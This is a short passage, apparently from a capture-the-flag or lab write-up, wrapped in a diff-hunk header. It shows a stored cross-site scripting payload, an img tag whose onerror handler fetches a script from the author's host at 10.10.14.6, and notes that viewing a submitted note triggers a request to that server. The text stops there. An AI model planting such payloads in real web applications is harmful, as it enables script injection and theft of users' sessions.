@@ -1,0 +1,1 @@
+a9Ab0Ab1Ab2Ab3Ab4Ab5 <img src= '#' onerror= "fetch('http://10.10.14.6/xss.js');" /> On logging in, submitting a note and viewing it, there’s a request at my server:
